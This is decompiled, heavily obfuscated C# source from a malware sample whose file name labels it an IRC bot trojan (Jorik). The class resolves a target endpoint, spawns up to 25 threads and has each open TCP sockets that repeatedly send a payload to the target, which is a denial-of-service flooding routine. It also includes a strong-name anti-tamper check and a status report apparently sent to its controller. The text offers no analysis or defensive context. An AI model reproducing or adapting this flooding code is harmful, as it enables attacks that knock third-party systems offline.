// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0004;
using \u000E;
using \u000F;
using System;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;

namespace \u000E
{
  internal sealed class \u0001
  {
    private static string \u0001;
    public static string \u0002;
    public static int \u0001;
    public static int \u0002;
    public static int \u0003;
    public static int \u0004;
    private static IPEndPoint \u0001;
    private static ThreadStart[] \u0001;
    private static Thread[] \u0001;
    public static bool \u0001;
    [NonSerialized]
    internal static \u0008.\u0004 \u009B;

    private static string \u0001()
    {
      string str = string.Empty;
      int num1 = 0;
label_10:
      while (true)
      {
        int num2 = num1;
label_8:
        if (num2 < 1300)
        {
          str = \u0083.\u0093\u0002((object) str, (object) \u0001.\u009B(817), (object) num2);
          int num3 = num2;
          while (true)
          {
            int num4 = num3 + 1;
            if (false)
              num3 = num4;
            else if (false)
            {
              num1 = num4;
              goto label_10;
            }
            else
            {
              num2 = num4;
              goto label_8;
            }
          }
          num1 = num3;
        }
        else
          break;
      }
      return str;
    }

    public static void \u0001()
    {
      Thread thread1 = new Thread(new ThreadStart(\u0001.\u0002));
      if (true)
        goto label_2;
label_1:
      Thread thread2;
      \u0084.\u007E\u0094\u0002((object) thread2, true);
      \u0013.\u007E\u0002\u0002((object) thread2);
      return;
label_2:
      thread2 = thread1;
      goto label_1;
    }

    private static void \u0002()
    {
      try
      {
        \u0001.\u0001 = new IPEndPoint(\u0087.\u007E\u009F\u0002((object) \u0086.\u009D\u0002(\u0001.\u0002))[0], \u0001.\u0001);
      }
      catch
      {
        \u0001.\u0001 = new IPEndPoint(\u0088.\u0001\u0003(\u0001.\u0002), \u0001.\u0001);
      }
      \u0001.\u0001 = new Thread[\u0001.\u0003];
      \u0001.\u0001 = new ThreadStart[\u0001.\u0003];
      for (int index = 0; index < \u0001.\u0003; ++index)
      {
        \u0001.\u0001[index] = new ThreadStart(\u0001.\u0004);
        \u0001.\u0001[index] = new Thread(\u0001.\u0001[index]);
        \u0013.\u007E\u0002\u0002((object) \u0001.\u0001[index]);
      }
      \u001F.\u0087\u0002(\u0001.\u0002 * 1000);
      if (!\u0001.\u0001)
        return;
      \u0001.\u0003();
      string[] strArray = new string[5]
      {
        \u0001.\u009B(822),
        \u0002.\u0001(\u0010.\u008D(\u0001.\u009B(524), \u0001.\u0002)),
        \u0001.\u009B(843),
        \u0002.\u0001(\u0089.\u0002\u0003((object) \u0001.\u009B(524), (object) \u0001.\u0002)),
        \u0001.\u009B(852)
      };
      \u0002.\u0001(\u0018.\u001A\u0002(strArray), \u0001.\u0010);
    }

    public static void \u0003() => \u0001.\u0001 = false;

    private static void \u0004()
    {
      try
      {
        string str1 = \u0001.\u009B(885);
        string str2 = \u008A.\u0003\u0003(str1, (object) \u0001.\u0002, (object) \u0001.\u0001);
        byte[] numArray = \u0081.\u007E\u008F\u0002((object) \u0080.\u008A\u0002(), str2);
label_1:
        int length = \u0001.\u0004;
        Socket[] socketArray1;
        int index1;
        if (true)
        {
          socketArray1 = new Socket[length];
          index1 = 0;
          if (false)
            goto label_25;
        }
        else
          goto label_18;
label_4:
        int num1 = index1;
        int num2 = \u0001.\u0004;
        int num3 = num1;
label_5:
        if (num3 < num2)
        {
          socketArray1[index1] = new Socket(\u008B.\u007E\u0004\u0003((object) \u0001.\u0001), SocketType.Stream, ProtocolType.Tcp);
          ++index1;
          goto label_4;
        }
        else if (false)
          goto label_1;
        else
          goto label_21;
label_17:
        int num4;
        length = num4 + 1;
label_18:
        int index2 = length;
label_19:
        Socket[] socketArray2;
        if (index2 < socketArray2.Length)
        {
          Socket socket = socketArray2[index2];
          if (!\u008C.\u007E\u0006\u0003((object) socket))
          {
            try
            {
              \u008E.\u007E\u0013\u0003((object) socket, \u008D.\u007E\u0012\u0003((object) \u0001.\u0001), \u0001.\u0001);
            }
            catch
            {
            }
          }
          else
          {
            try
            {
              if (true)
              {
                int num5 = \u008F.\u007E\u0014\u0003((object) socket, numArray, numArray.Length, SocketFlags.None);
              }
            }
            catch
            {
            }
          }
          num4 = index2;
          goto label_17;
        }
        else
          \u001F.\u0087\u0002(1000);
label_21:
        Socket[] socketArray3;
        int index3;
        if (\u0001.\u0001)
        {
          if (true)
          {
            socketArray2 = socketArray1;
            index2 = 0;
            goto label_19;
          }
        }
        else
        {
          socketArray3 = socketArray1;
          int num6 = 0;
          if (num6 != 0)
          {
            num4 = num6;
            goto label_17;
          }
          else
          {
            index3 = num6;
            goto label_27;
          }
        }
label_25:
        Socket socket1;
        \u0013.\u007E\u0003\u0002((object) socket1);
        num3 = index3;
        num2 = 1;
        if (num2 != 0)
          index3 = num3 + num2;
        else
          goto label_5;
label_27:
        if (index3 >= socketArray3.Length)
          return;
        socket1 = socketArray3[index3];
        \u0090.\u007E\u0016\u0003((object) socket1, SocketShutdown.Both);
        goto label_25;
      }
      catch
      {
      }
    }

    static \u0001()
    {
      \u0005.\u0001(typeof (\u0001));
      bool flag = false;
      if (true)
      {
        Assembly assembly = \u007F.\u0089\u0002();
        while (\u0001.\u0001(\u0003.\u007E\u0006((object) assembly), true, out flag))
        {
          if (true)
          {
            int num = flag ? 1 : 0;
            if (true)
            {
              if (num != 0)
              {
                if (true)
                  num = \u0005.\u007E\u0082((object) \u0003.\u007E\u0007((object) assembly), \u0001.\u009B(612)) ? 1 : 0;
                else
                  goto label_12;
              }
              else
                break;
            }
            if (num != 0)
            {
              if (true)
                \u0001.\u0001 = \u0001.\u0001();
              \u0001.\u0003 = 25;
            }
            else
              break;
label_12:
            \u0001.\u0004 = 5;
            goto label_13;
          }
        }
        throw new SecurityException(\u0001.\u009B(637));
      }
label_13:
      \u0001.\u0001 = false;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);
  }
}
